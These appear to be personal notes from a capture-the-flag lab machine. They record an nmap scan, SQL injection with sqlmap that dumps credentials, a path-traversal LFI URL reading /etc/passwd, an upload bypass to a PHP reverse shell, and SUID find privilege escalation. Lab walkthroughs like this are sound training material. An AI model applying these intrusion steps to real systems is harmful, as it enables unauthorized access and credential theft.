Started with a full namp scan with port scan
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.8.255
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:8e:78:ae:b9:ab:36:ee:b1:6b:0d:7d:a8:d7:1e:3c (RSA)
|   256 af:66:49:11:5c:19:32:07:5f:38:82:ad:a6:1b:af:aa (ECDSA)
|_  256 df:68:2c:f2:c8:57:fa:e3:57:19:9b:72:e9:3b:d4:09 (ED25519)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: EXPOSED
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


The Ftp server has nothing on it 

Found a intersting folder on the web server
http://10.10.236.75:1337/admin/
http://10.10.236.75:1337/admin_101/
http://10.10.236.75:1337/upload-cv00101011/index.php
http://10.10.236.75:1337/file1010111/index.php

Database: expose                                                                                                   
Table: config
[2 entries]
+----+------------------------------+-----------------------------------------------------+
| id | url                          | password                                            |
+----+------------------------------+-----------------------------------------------------+
| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929 (easytohack)       |
| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z

Found a sql injection on the admin_101 pannel exploit it with sqlmap and burp request
got login for pannel passowrd is VeryDifficultPassword!!#@#@!#!@#1231

http://10.10.236.75:1337/file1010111/index.php
This link is asking me to fuzz for DOM elements and parameter fuzzing says also important
Found this hint on the side in the inspecter
Hint: Try file or view as GET parameters?
Found LFI with this link
http://10.10.236.75:1337/file1010111/index.php?file=/../../../../../etc/passwd

On the link this is the user to login into the link zeamkish
http://10.10.236.75:1337/upload-cv00101011/index.php
This is the upload directory for the files
http://10.10.236.75:1337/upload-cv00101011/upload_thm_1001/

Need to use content tampering with burp with get revse shell
https://br4ind3ad.medium.com/port-swigger-file-upload-vulnerability-lab-2-679316315c39

Got rev shell useing this link
http://10.10.236.75:1337/file1010111/index.php?file=../upload-cv00101011/upload_thm_1001/php-reverse-shell.php.png

Got access to the sevrer found ssh creds in the zeamkish directory 
SSH CREDS
`zeamkish:<Readcted>`

after running linpeas on the box i found some maybe usefull privsec
/usr/bin/nano
/usr/bin/find

Got privsec with the find and the suid binary
